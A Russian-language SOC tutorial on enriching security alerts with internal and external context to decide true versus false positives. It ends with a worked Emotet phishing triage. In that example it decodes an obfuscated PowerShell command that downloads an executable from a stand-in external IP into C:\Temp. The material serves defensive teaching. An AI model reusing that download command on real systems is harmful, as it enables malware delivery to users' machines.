# Обогащение алертов: контекст для оценки TP/FP

## Контекст и базовые понятия: обогащение и проблема истинности алертов

**Обогащение алерта** (alert enrichment) – процесс дополнения исходного события безопасности дополнительными данными из внутренних и внешних источников. Целью является формирование контекста, достаточного для принятия решения о том, является ли событие **True Positive (TP)** – реальной угрозой, требующей реагирования, или **False Positive (FP)** – ложным срабатыванием, которое можно безопасно закрыть. Аналитик L1 SOC, работающий с очередью алертов, использует обогащение как ключевой инструмент сортировки – оно позволяет превратить единичную сигнатуру в осмысленный инцидент либо исключить шум.

Без обогащения алерт представляет собой сырой сигнал, часто состоящий только из системного идентификатора события, временной метки и минимального набора параметров, например:
```
Событие: Windows Event ID 4688
Параметры: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -EncodedCommand <base64 blob>
Хост: workstation-23.domain.local
Пользователь: user123
```
Такой информации недостаточно, чтобы отличить легитимную административную операцию от действий злоумышленника. Именно нехватка контекста – основная причина лавины FP в SOC. По данным отраслевых отчетов, **до 60–80% алертов, поступающих на уровень L1, при первичном анализе без обогащения расцениваются как потенциальные FP**; после добавления контекста доля реально эскалируемых инцидентов резко возрастает, а время разбора каждого алерта снижается с десятков минут до единиц.

**Ключевые понятия:**
- **Исходный алерт** – запись о подозрительной активности, сгенерированная средством обнаружения (SIEM, EDR, IDS) на основе правила или сигнатуры.
- **Контекст** – любые дополнительные данные, связывающие исходный алерт с окружением: информация о хосте, пользователе, сетевых соединениях, репутационных оценках внешних объектов, истории аналогичных событий.
- **Внутренний контекст** – данные, которые уже находятся в инфраструктуре организации: логи ОС, Active Directory, DHCP, сетевых устройств, EDR-телеметрия, информация об установленном ПО, типовые паттерны активности пользователя.
- **Внешний контекст** – данные, получаемые из сторонних источников: Threat Intelligence Feeds, GeoIP-базы, репутационные сервисы (VirusTotal, AbuseIPDB), утилиты исследования инфраструктуры (`whois`, `dig`), базы уязвимостей (NVD).
- **Оценка TP/FP** – бинарное решение, принимаемое аналитиком на этапе триажа. Оно должно опираться на объективные критерии, извлечённые из контекста.

Критически важно разграничить четыре возможных исхода любой классификации алерта по отношению к реальному состоянию «инцидент есть – инцидента нет». В таблице ниже показана связь между результатом решения аналитика, фактической ситуацией и последствиями для уровня усталости от алертов (alert fatigue) и пропущенных инцидентов.

| Результат оценки аналитиком | Фактическое событие | Классификация | Риск для SOC без обогащения | Как контекст меняет оценку |
|-----------------------------|---------------------|----------------|-----------------------------|----------------------------|
| Алёрт подтверждён, эскалирован | Реальная угроза (злоумышленник) | **True Positive (TP)** | Риск пропустить: низкий. Но избыточные TP одного типа (например, сканер уязвимостей) порождают рутину и отвлекают от реальных атак. | Контекст (источник, время, учётная запись) отличает массовый сканер от таргетированной атаки, снижая ненужные эскалации. |
| Алёрт подтверждён, эскалирован | Легитимная активность или ошибка детектирования | **False Positive (FP)** | Высокий: неоправданные затраты ресурсов L2/L3, десенсибилизация к реальным угрозам. | Контекст (поведение пользователя, легитимное ПО, внутренние политики) позволяет быстро закрыть алерт без эскалации. |
| Алёрт закрыт как ложный | Реальная угроза | **False Negative (FN)** | Критический: пропуск инцидента, возможная компрометация. | Контекст помогает не закрыть слепо алерт: например, необычный IP в рабочее время с обогащением «принадлежит злоумышленнику» переквалифицирует алерт в TP. |
| Алёрт отсутствует или закрыт | Легитимная активность | **True Negative (TN)** | Нет риска. Эффективность обнаружения высокая. | Контекст улучшает саму логику детектирования, уменьшая количество будущих FP. |

Из таблицы видно, что центральная задача обогащения – снизить неопределённость в правом верхнем и левом нижнем квадрантах (FP и FN), одновременно сокращая объём ручной обработки для типовых TN. В этом и состоит ценность контекста: он преобразует сигнатуру «подозрительный процесс» в конкретику «пользователь из бухгалтерии запустил давно известное приложение, установленное администратором, с цифровой подписью Microsoft, соединяющееся с внутренним сервером обновлений».

Следует отличать **обогащение на лету** (real-time enrichment), выполняемое автоматически правилами SIEM/SOAR, от **ручного обогащения**, которое проводит аналитик L1 при первичном расследовании алерта после его появления в очереди. Оба этапа направлены на формирование контекста, но различаются по исходным данным и доступному инструментарию.

Таким образом, обогащение – это не просто «добавить больше данных», а целенаправленный сбор именно тех параметров, которые позволяют аналитику ответить на три ключевых вопроса триажа:
1. **Выглядит ли событие нетипичным** для данного хоста/пользователя/времени?
2. **Есть ли внешние индикаторы злонамеренности** (IoC), подтверждающие угрозу?
3. **Объясняется ли событие известной легитимной причиной** (запланированное задание, обновление ПО, одобренное изменение)?

Без ответа хотя бы на один из этих вопросов любое решение о TP/FP останется гаданием.

## Внутреннее устройство процесса обогащения и источники контекста

Раскрытие цели обогащения требует понимания того, из каких источников извлекается контекст и как эти данные преобразуются в полезный для аналитика вид. Данный раздел представляет собой обзор класса источников и методов их применения; для каждого источника указаны извлекаемый контекст и его влияние на оценку TP/FP.

### Классификация источников обогащения

Все данные, используемые для обогащения, делятся на внутренние и внешние. Внутренние уже присутствуют в инфраструктуре, внешние необходимо запрашивать из облачных или общедоступных сервисов. При анализе каждого алерта аналитик комбинирует оба класса, двигаясь от наиболее доступных источников к более специализированным.

### Структура данных, получаемых при обогащении

Каждый источник предоставляет специфический набор полей, который аналитик добавляет к исходному алерту. Рассмотрим их структурированно на примере нескольких ключевых источников.

**1. Внутренний источник: EDR-процесс + активный пользователь**

При срабатывании алерта типа «подозрительный процесс» первым шагом является запрос полной телеметрии процесса с конечной точки. Типичная JSON-подобная структура ответа от EDR-агента может включать:
```json
{
  "process_event": {
    "pid": 2840,
    "parent_pid": 1308,
    "image_path": "C:\\Windows\\System32\\cmd.exe",
    "command_line": "cmd.exe /c powershell -Enc JABhAD0AJwBoAHQA...",
    "user_sid": "S-1-5-21-1234567890-1234567890-1234567890-1234",
    "integrity_level": "high",
    "signature_status": "Not Signed",
    "creation_time_utc": "2025-03-27T08:14:02.234Z"
  },
  "user_context": {
    "login_domain": "DOMAIN",
    "login_id": 0x3E7,
    "group_memberships": ["Domain Users", "Local Administrators"],
    "account_creation_date": "2024-01-15",
    "password_last_set": "2025-03-26T09:01:00Z"
  }
}
```
Эта структура позволяет оценить сразу несколько аспектов:
- `parent_pid` и `image_path` parent-процесса выявят вектор запуска (например, из офисного документа или планировщика).
- `signature_status` – легитимный исполняемый файл почти всегда подписан.
- `group_memberships` и `account_creation_date` – если административная группа у свежесозданного пользователя, это критический признак компрометации.

**2. Внешний источник: проверка IP-адреса по репутационной базе**

Запрос к API VirusTotal или AbuseIPDB возвращает контекст о наблюдаемой активности IP. Схематичный ответ:
```json
{
  "ip_address": "203.0.113.45",
  "reputation_score": 12,
  "categories": ["malware", "phishing"],
  "last_reported": "2025-03-27T06:45:12Z",
  "country": "RU",
  "as_owner": "SomeHosting Inc.",
  "historical_domains": ["bad.example.com", "c2.other.net"],
  "open_ports": [80, 443, 3389]
}
```
Для оценки TP/FP важно поле `reputation_score` (чем ниже, тем злонамереннее ресурс), а также `categories`. Контекст GeoIP (`country`) сам по себе не является индикатором угрозы, но в сочетании с бизнес-логикой (например, компания не имеет операций в данном регионе) служит сильным сигналом.

**3. Внутренний источник: логи аутентификации и сессионная история**

При подозрительном входе в систему или использовании учётной записи обогащение включает извлечение истории логинов с контроллера домена. Формат событий 4624/4625 Windows Security Log даёт:
```text
Logon Type: 3 (Network) или 10 (RemoteInteractive)
Source Network Address: 192.168.10.15
Account Name: user123
Logon Process: Kerberos
```
Сопоставление этой информации с нормальным профилем пользователя (рабочее время, тип хоста, IP-диапазон) – ключ к отсеву FP.

### Цепочка контекстных связей

Контекст редко добывается из одного источника; чаще аналитик выстраивает связную картину, соединяя несколько обогащений. Ниже приведена иллюстративная схема потока данных при анализе алерта, связанного с подозрительным сетевым соединением:

```text
[SIEM Alert: Outbound connection to suspicious IP 203.0.113.45:443, host=WS-23, user=ivanov]
        │
        ▼
1. Внешнее обогащение IP → GeoIP: Russia, Reputation: malicious, AS: hosting
        │
        ▼
2. Внутреннее обогащение хоста: EDR показал процесс powershell.exe, PID 2840
        │
        ▼
3. Внутреннее обогащение процесса: родитель – winword.exe, пользователь ivanov,
   командная строка содержит base64-обфусцированный скрипт
        │
        ▼
4. Внешнее обогащение хэша скрипта → VirusTotal: 5/70 детектов, загрузка
   отчета песочницы → сетевое взаимодействие с тем же IP
        │
        ▼
5. Внутреннее обогащение пользователя: ivanov входит в группу «Бухгалтерия»,
   вчера менял пароль, обычный рабочий график 9–18.
        │
        ▼
6. Корреляция: IP – злонамеренный, процесс запущен из Word, обфускация,
   подтверждение из песочницы, но пользователь типичный и время рабочее →
   вероятен фишинг-документ → рейтинг TP высокий. Алёрт эскалируется.
```

Каждый шаг на схеме добавляет слой контекста, который изменяет гипотезу аналитика. Ценность контекста проявляется именно в накоплении непротиворечивых индикаторов: единичный признак (например, страна IP) – слабый сигнал, а совокупность – убедительное доказательство.

Отдельно отметим, что **обогащение само по себе не является вердиктом**. Аналитик должен уметь взвешивать надёжность источников: данные из внутренней телеметрии обычно заслуживают большего доверия, чем внешние репутационные оценки, которые могут быть неполными или устаревшими.

## Применение: типовые операции обогащения для оценки алерта

На уровне L1 SOC обогащение выполняется преимущественно с помощью готовых инструментов, интегрированных в рабочую среду (SIEM, SOAR-платформа) либо вручную через веб-интерфейсы и командную строку. Рассмотрим практические операции обогащения, которые аналитик выполняет для получения контекста, необходимого для классификации TP/FP. Основное внимание уделяется командам и запросам, обеспечивающим быстрое извлечение релевантных данных.

### Обогащение IP-адреса и сетевого соединения

При обнаружении подозрительного исходящего или входящего соединения первый шаг – получение контекста об IP-адресе. В дополнение к автоматическим фидам аналитик может использовать стандартные сетевые утилиты и онлайн-сервисы.

**Пример ручного обогащения IP-адреса с помощью PowerShell и API AbuseIPDB:**

```powershell
# Запрос к AbuseIPDB для проверки репутации IP
$apiKey = "<ваш_API_ключ>"
$ip = "203.0.113.45"
$response = Invoke-RestMethod -Uri "https://api.abuseipdb.com/api/v2/check" `
    -Headers @{ "Key" = $apiKey; "Accept" = "application/json" } `
    -Body @{ "ipAddress" = $ip; "maxAgeInDays" = "90" } `
    -Method Get
$response.data | Select-Object ipAddress, abuseConfidenceScore, totalReports, countryCode, usageType, isp
```
Ожидаемая структура вывода:
```
ipAddress        : 203.0.113.45
abuseConfidenceScore : 95
totalReports     : 120
countryCode      : RU
usageType        : Data Center/Web Hosting/Transit
isp              : SomeHosting Inc.
```
Ключевой параметр здесь – `abuseConfidenceScore`, который отражает вероятность злонамеренности от 0 до 100 на основе жалоб сообщества. Значение выше 90 в сочетании с `usageType` «Data Center» для соединения, нетипичного для организации, резко повышает вероятность TP.

**Проверка GeoIP-локации без API (локальная база):**
```bash
# Использование geoiplookup (требует установки GeoIP)
geoiplookup 203.0.113.45
```
Вывод:
```
GeoIP Country Edition: RU, Russian Federation
```
Сам по себе вывод «RU» не делает алерт TP, но если компания не ведёт бизнеса с Россией и не имеет там сотрудников, это становится значимым контекстным сигналом.

### Обогащение хэша файла или процесса

Часто алерт приходит на запуск неизвестного исполняемого файла или скрипта. Необходимо быстро проверить его репутацию.

**Запрос к VirusTotal Public API для анализа хэша SHA256:**
```bash
curl --request GET \
     --url 'https://www.virustotal.com/api/v3/files/222e3c8b0c55799f2b7a8f2e2b5e1a3670d2e9fb8f8f3c8a144a7d2f39e16bc5' \
     --header 'x-apikey: <ваш_ключ>'
```
Структура ответа (ключевые поля):
```json
{
  "data": {
    "id": "222e3c8b0c55799f2b7a8f2e2b5e1a3670d2e9fb8f8f3c8a144a7d2f39e16bc5",
    "attributes": {
      "last_analysis_stats": {
        "malicious": 15,
        "suspicious": 2,
        "undetected": 58
      },
      "type_description": "Win32 EXE",
      "first_submission_date": 1711382400,
      "tags": ["trojan", "downloader"],
      "signature_info": { "product": "Microsoft Office", "signer": "Microsoft Corporation" }
    }
  }
}
```
Ключевые индикаторы: `malicious ≥ 5` на популярных антивирусах – серьёзный сигнал, особенно при наличии тегов `trojan`, `downloader`. Если `signer` содержит легитимное имя и файл известен давно, это может указывать на административное ПО, но не исключает злоупотребления (например, `certutil.exe` с вредоносными аргументами). Поэтому обогащение хэша никогда не должно использоваться изолированно – необходимо сверяться с родительским процессом и командной строкой.

### Обогащение контекста учётной записи и хоста

Внутри домена Windows ценные контекстные данные получаются через запросы к Active Directory или через WMI/WinRM.

**Проверка свойств пользователя и его групп в AD (PowerShell):**
```powershell
# Получение детальной информации о пользователе, включая дату создания и последний вход
Get-ADUser -Identity 'ivanov' -Properties Created, LastLogonDate, PasswordLastSet, MemberOf, BadLogonCount, LockedOut | 
    Select-Object Name, SamAccountName, Created, LastLogonDate, PasswordLastSet, BadLogonCount, LockedOut, 
                  @{Name="Groups"; Expression={$_.MemberOf -join "; "}}
```
Вывод может выглядеть так (иллюстративная схема):
```
Name             : Ivanov Ivan
SamAccountName   : ivanov
Created          : 15.01.2024 10:00:00
LastLogonDate    : 27.03.2025 9:15:02
PasswordLastSet  : 26.03.2025 9:01:00
BadLogonCount    : 0
LockedOut        : False
Groups           : CN=Domain Users,CN=Users,DC=domain,DC=local;
                   CN=Accounting,CN=Users,DC=domain,DC=local
```
Контекстная интерпретация: если алерт пришёл на пользователя `ivanov` в нерабочее время (например, 23:45) при обычном графике 9–18, и при этом `BadLogonCount` внезапно вырос до 5, а страна подключения – Китай, то совокупность контекстов делает FP маловероятным; скорее всего, учётная запись скомпрометирована.

**Проверка хоста через WMI (удалённый запрос):**
```cmd
wmic /node:"workstation-23" process get name,ProcessId,ParentProcessId,CommandLine /format:csv
```
Вывод CSV с перечнем процессов позволит найти родительскую цепочку для подозрительного процесса и выявить, например, что `powershell.exe` запущен `explorer.exe`, а не `winword.exe`, что меняет оценку.

### Обогащение через SIEM-корреляцию

Современные SIEM-решения (Splunk, Microsoft Sentinel, Elastic) позволяют выполнять обогащающие запросы к индексированным данным за считанные секунды. Аналитик L1 часто использует заранее подготовленные поисковые запросы (searches).

**Пример KQL-запроса в Microsoft Sentinel для обогащения алерта по хосту и времени:**
```kql
let AlertTime = datetime(2025-03-27T08:14:02.234Z);
let HostName = "workstation-23";
union SecurityEvent, WindowsEvent
| where Computer == HostName and TimeGenerated between ((AlertTime - 5m) .. (AlertTime + 5m))
| project TimeGenerated, EventID, Activity, Account, ProcessName, CommandLine, IpAddress
| order by TimeGenerated asc
```
Этот запрос показывает все события безопасности на хосте за 10-минутное окно вокруг алерта. Картина может показать, что непосредственно перед запуском подозрительного процесса была выполнена успешная сетевая аутентификация с того же IP-адреса, что укажет на удалённое выполнение кода.

**Типичные ошибки при обогащении:**
- **Переоценка одного индикатора.** Например, решение на основе только GeoIP без учёта легитимных VPN сотрудников.
- **Игнорирование временных окон.** Контекст должен быть актуален: данные трёхдневной давности могут ввести в заблуждение.
- **Неиспользование внутренней телеметрии.** Внешние сервисы (VirusTotal) не знают специфику вашей инфраструктуры, поэтому обязательно сверяйте с локальными данными.

## Сквозной практический пример: анализ алерта на подозрительный PowerShell-скрипт

**Исходные условия:** Аналитик L1 SOC получает алерт от SIEM (Sentinel) о событии с высоким приоритетом: на хосте `SRV-APP01` пользователем `petrov_d` запущен процесс PowerShell с обфусцированной командной строкой и установлено исходящее соединение на внешний IP `198.51.100.77` по порту 443. В организации настроена интеграция с Active Directory, EDR (Microsoft Defender for Endpoint) и VirusTotal. Аналитик должен за 5 минут принять решение: эскалировать как TP или закрыть как FP.

### Шаг 1: Первичный анализ исходного алерта и извлечение ключевых параметров

Аналитик открывает алерт в Sentinel и выписывает критические значения. Артефакт – фрагмент JSON алерта (иллюстративная схема):
```json
{
  "alertId": "123e4567-e89b-12d3-a456-426614174000",
  "timestamp": "2025-03-27T09:15:20.123Z",
  "hostName": "SRV-APP01",
  "userName": "petrov_d",
  "processName": "powershell.exe",
  "commandLine": "powershell.exe -NoP -NonI -W Hidden -Enc JABhAD0AJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA3ADcAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGEAIAAtAE8AdQB0AEYAaQBsAGUAIABDAFwAVABlAG0AcABcAHUAcAAuAGUAeABlAA==",
  "destinationIp": "198.51.100.77",
  "destinationPort": 443
}
```
Командная строка закодирована в Base64. Аналитик выполняет декодирование (рутинная операция):
```bash
echo 'JABhAD0AJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA3ADcAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGEAIAAtAE8AdQB0AEYAaQBsAGUAIABDAFwAVABlAG0AcABcAHUAcAAuAGUAeABlAA==' | base64 -d
```
Результат:
```
$a='http://198.51.100.77'; Invoke-WebRequest -Uri $a -OutFile C:\Temp\up.exe
```
Видно, что скрипт загружает исполняемый файл с внешнего IP и сохраняет его в `C:\Temp\up.exe`. Это уже подозрительно, но может быть и неудачной автоматизацией администратора. Требуется контекст.

### Шаг 2: Обогащение внешнего IP-адреса

Аналитик использует встроенную панель обогащения IP в Sentinel, которая агрегирует данные из нескольких Threat Intelligence-фидов. Вывод API-запроса (иллюстративная схема):
```json
{
  "ip": "198.51.100.77",
  "threatTypes": ["malware", "phishing"],
  "confidence": 85,
  "geo": { "country": "CN", "city": "Shanghai", "org": "CheapVPS Hosting" },
  "firstSeen": "2025-02-10",
  "lastSeen": "2025-03-27",
  "associatedUrls": ["http://198.51.100.77/payload.exe", "http://malicious.example.net"]
}
```
Контекст: IP определён как вредоносный, страна Китай (компания работает только в Европе), хостинг-провайдер, замечен в раздаче вредоносных файлов. Это сразу повышает вес гипотезы TP.

### Шаг 3: Обогащение хоста и пользователя через внутреннюю телеметрию

Аналитик запускает запрос в Defender for Endpoint, чтобы увидеть полную картину процессов на `SRV-APP01` за ±2 минуты от алерта. Используется advanced hunting запрос (KQL):
```kql
let targetHost = "SRV-APP01";
let alertTime = datetime(2025-03-27T09:15:20.123Z);
DeviceProcessEvents
| where DeviceName == targetHost and Timestamp between ((alertTime - 2m) .. (alertTime + 2m))
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
```
Результат (фрагмент):
```text
Timestamp [UTC]      FileName         ProcessCommandLine                     InitiatingProcessFileName   AccountName
2025-03-27 09:14:18  winword.exe      "C:\Program Files\...\WINWORD.EXE"     explorer.exe                petrov_d
2025-03-27 09:15:10  powershell.exe   "powershell.exe -NoP -NonI ..."        winword.exe                 petrov_d
2025-03-27 09:15:20  powershell.exe   (OutFile создание)                     powershell.exe               petrov_d
```
Родителем PowerShell оказался Microsoft Word, что классический признак фишинга через вредоносный документ (макрос или уязвимость). Контекст усиливается.

Далее проверка свойств пользователя `petrov_d` в AD (через консоль Sentinel, выполняющую LDAP-запрос). Вывод:
```text
User: petrov_d (Petrov Dmitri)
Created: 2023-06-12
Department: Marketing
LastLogon: 2025-03-27 08:45 (обычный вход на рабочую станцию)
Group memberships: Domain Users, Marketing, Remote Desktop Users
Password last set: 2025-03-01
BadPwdCount: 0
```
Никаких аномалий, пользователь стандартный, не администратор на сервере `SRV-APP01`. Почему он зашёл на сервер? Дополнительный запрос логов аутентификации (EventID 4624) на `SRV-APP01` показывает, что `petrov_d` аутентифицировался по RDP за 10 минут до алерта, что нетипично: обычно маркетинг не использует серверы приложений. Это ещё один индикатор.

### Шаг 4: Обогащение загружаемого файла (хэш)

Аналитик проверяет, не остался ли на диске `C:\Temp\up.exe` и не перехвачен ли он EDR. Defender for Endpoint автоматически отправил файл на анализ в облако. В портале доступен вердикт:
```json
{
  "fileName": "up.exe",
  "sha256": "b8a0e7c3...",
  "threatVerdict": "TrojanDownloader:Win32/Emotet!MTB",
  "analysisSummary": "File drops banking trojan, connects to C2 at 198.51.100.77"
}
```
Проверка хэша через VirusTotal (опционально, для перепроверки):
```bash
curl --request GET --url 'https://www.virustotal.com/api/v3/files/b8a0e7c3...' --header 'x-apikey: <key>'
```
Ответ содержит:
```json
{ "data": { "attributes": { "last_analysis_stats": { "malicious": 42, "undetected": 23 }, "type_description": "Win32 EXE", "tags": ["emotet", "trojan"] } } }
```
Теперь картина полная: IP вредоносный, родительский процесс Word, загрузка детектированного трояна Emotet, пользователь, нехарактерный для сервера, выполнил фишинговый документ. Все слои контекста сходятся на TP.

**Вывод:** Алёрт является True Positive, критический инцидент. Аналитик немедленно эскалирует на L2 для изоляции хоста, сброса пароля пользователя и блокировки IP на периметре. Время, затраченное на обогащение и принятие решения, – около 4 минут.

Без обогащения алёрт мог бы выглядеть как «очередной PowerShell в среде Windows», что привело бы либо к пропуску (FP-классификация), либо к длительному безрезультатному расследованию. Данный пример демонстрирует практическую ценность целенаправленного сбора контекста для качественного триажа.
